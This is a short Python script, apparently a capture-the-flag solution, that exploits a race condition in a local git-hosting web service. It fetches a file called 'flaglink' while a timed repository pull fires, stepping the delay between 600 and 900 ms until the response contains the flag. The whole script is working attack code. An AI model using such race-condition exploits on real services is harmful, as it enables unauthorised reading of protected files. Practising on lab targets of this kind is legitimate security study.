import subprocess
import threading
import time

import requests

BASE_URL = "http://localhost:8045"
USER = "MrVasya"
NAME = "test"
FILENAME = "flaglink"

DELAY_START = 0.6  # 600 ms
DELAY_END = 0.9  # 900 ms
STEP = 0.01  # 20 ms шаг

FLAG = "FLAG"  # что ищем в теле


def fetch_file(result_container):
    try:
        print("starting fetch file...")
        url = f"{BASE_URL}/repo/{USER}/{NAME}/file/{FILENAME}"
        r = requests.get(url)
        print("got file contents")
        r.raise_for_status()
        if FLAG in r.text:
            result_container["success"] = True
            result_container["content"] = r.text
    except Exception:
        pass


def trigger_update():
    try:
        url = f"{BASE_URL}/repo/{USER}/{NAME}/pull"
        data = {"remote": "origin", "branch": "main"}
        requests.post(url, data=data)
        print("repo updated")
    except Exception:
        pass


def run_script(path):
    subprocess.run(
        [path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
    )


for delay in [
    DELAY_START + i * STEP for i in range(int((DELAY_END - DELAY_START) / STEP) + 1)
]:
    print(f"Trying delay: {int(delay*1000)} ms", flush=True)

    # Убираем флаг
    run_script("./remove_flag.sh")

    # Добавляем флаг
    run_script("./send_flag.sh")

    result = {"success": False, "content": ""}

    t_fetch = threading.Thread(target=fetch_file, args=(result,))
    t_update = threading.Thread(target=trigger_update)

    t_fetch.start()
    time.sleep(delay)
    t_update.start()

    t_fetch.join()
    t_update.join()

    if result["success"]:
        print(f"SUCCESS with delay {int(delay*1000)} ms")
        print(result["content"])
        break
    else:
        print(f"Failed with delay {int(delay*1000)} ms")
